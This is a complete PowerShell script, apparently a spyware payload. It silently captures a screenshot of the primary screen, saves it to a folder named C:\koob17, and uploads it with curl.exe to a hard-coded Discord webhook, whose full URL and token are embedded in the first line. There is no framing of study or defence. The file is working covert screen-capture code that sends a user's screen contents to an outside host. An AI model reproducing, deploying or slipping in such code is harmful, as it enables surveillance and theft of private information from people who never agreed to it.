$webhook='https://discord.com/api/webhooks/1179938535143387156/PoQMl0MfzSx4cmNtilPPvKVw-DxOplHCgFumUl7HJWCfQCJET9MA0nUm7G36R1oKZQnt'

$Path = "C:\koob17"
$FileName = "temp.png"

# Make sure that the directory to keep screenshots has been created, otherwise create it
If (!(Test-Path $Path)) {
    New-Item -ItemType Directory -Force -Path $Path
}

Add-Type -AssemblyName System.Windows.Forms
$screen = [System.Windows.Forms.Screen]::PrimaryScreen.Bounds

# Get the current screen resolution
$image = New-Object System.Drawing.Bitmap($screen.Width, $screen.Height)

# Create a graphic object
$graphic = [System.Drawing.Graphics]::FromImage($image)
$point = New-Object System.Drawing.Point(0, 0)
$graphic.CopyFromScreen($point, $point, $image.Size)

$cursorBounds = New-Object System.Drawing.Rectangle([System.Windows.Forms.Cursor]::Position, [System.Windows.Forms.Cursor]::Current.Size)

# Get a screenshot
[System.Windows.Forms.Cursors]::Default.Draw($graphic, $cursorBounds)

$screen_file = Join-Path -Path $Path -ChildPath $FileName

# Save the screenshot as a PNG file
$image.Save($screen_file, [System.Drawing.Imaging.ImageFormat]::Png)

curl.exe -s -F "file=@C:\koob17\temp.png" $webhook
